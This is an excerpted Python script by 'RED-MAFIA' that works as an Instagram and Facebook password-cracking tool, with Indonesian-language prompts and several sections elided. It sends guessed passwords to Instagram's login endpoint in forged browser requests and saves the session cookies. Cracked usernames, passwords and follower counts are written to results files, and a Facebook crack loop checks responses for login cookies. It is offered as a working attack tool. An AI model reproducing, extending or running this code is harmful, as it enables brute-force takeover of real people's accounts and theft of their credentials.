# code by RED-MAFIA
# my facebook ( https://www.facebook.com/ᎡᎬᎠ-ᎷᎪҒᏆᎪ-102896575436747/ )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By RED-MAFIA
#        give me credit for copy script
import os
try:
    import requests
except ImportError:
...
def logo():
    print("""%s
\x1b[1;91mo--o  o--o o-o
\x1b[1;92m|   | |    |  \
\x1b[1;93mO-Oo  O-o  |   O
\x1b[1;94m|  \  |    |  /
\x1b[1;95mo   o o--o o-o

\x1b[1;91mo   o   O  o--o o-O-o   O
\x1b[1;92m |\ /|  / \ |      |    / \
\x1b[1;93m| O | o---oO-o    |   o---o
\x1b[1;94m|   | |   ||      |   |   |
\x1b[1;95m o   o o   oo    o-O-o o   o
\x1b[1;96m________R_____K_________
\x1b[1;97m________RED-MAFIA_____
...
def moch_yayan():
    ...
    if pepek == '':
        ...
        if upd =="":
            ...
            os.system('xdg-open htt?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
        ...
        for pw in __yan__:
            ...
            try:
                ...
                if "c_user" in cok:
                    ...
                    break
                for i in list('\|-/'):
                    sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,str(len(self.id)),len(ok),len(cp))),
                    sys.stdout.flush()
            except:
                pass
        loop += 1
...
def masuk_ig():
    ...
    ses.headers.update({
        ...
        "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    req_get = ses.get("https://www.instagram.com")
    ses.headers.update({"x-csrftoken": req_get.cookies.get_dict()["csrftoken"]})
    setting_params = {
        "enc_password": "#PWD_INSTAGRAM_BROWSER:0:"+str(int(time.time()))+":"+peweh,
        "username": userr,
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "", "trustedDeviceRecords": "{}"
    }
    req_post = ses.post("https://www.instagram.com/accounts/login/ajax/", data=setting_params, cookies=req_get.cookies.get_dict(), allow_redirects=True).text
    if "userId" in req_post:
        okh = ses.get("https://www.instagram.com/accounts/edit/")
        cookie = ";".join([key+"="+value for key, value in ses.cookies.get_dict().items()])
        open('.ig.txt', 'a').write(cookie)
        jalan("\n %s[%s*%s] selamat cookies kamu valid"%(N,O,N));time.sleep(2)
        exit(" [%s!%s] jalankan ulang perintah nya dengan ketik python run.py"%(M,N))
    elif "checkpoint_url" in req_post:
        print('\n %s[%s!%s] opshh seperti akun anda terkena checkpoint:('%(N,M,N));masuk_ig()
    elif "Please wait" in req_post:
...
def crack2(user, pwx):
    ...
    for pw in pwx:
        ...
        ses.headers.update({"x-csrftoken": req_get.cookies.get_dict()["csrftoken"]})
        setting_params = {
            "enc_password": "#PWD_INSTAGRAM_BROWSER:0:"+str(int(time.time()))+":"+pw,
            "username": user,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "", "trustedDeviceRecords": "{}"
        ...
        if "userId" in req_post:
            ...
            crack2(user, pw)
        for i in list('\|-/'):
            sys.stdout.write('\r [%s%s%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,i,N,loop,len(yan),len(ok),len(cp))),
            sys.stdout.flush()
...
def ingfo(user, pw, status):
    try:
        ...
        if status == "Berhasil":
            ...
            wrt = ' [✓] %s|%s|%s|%s'%(user, pw, pengikut, mengikuti)
            open('results/IG-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
        elif status == "Checkpoint":
            print(f"\r {N}[{K}#{N}] name      : {K}{nama}                 \n {N}[{K}#{N}] username  : {K}{user}                 \n {N}[{K}#{N}] password  : {K}{pw}                 \n {N}[{K}#{N}] followers : {K}{str(pengikut)}                 \n {N}[{K}#{N}] following : {K}{str(mengikuti)}                 \n")
            wrt = ' [×] %s|%s|%s|%s'%(user, pw, pengikut, mengikuti)
            open('results/CP-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
        else:
            pass
    except: pass
loping= 1
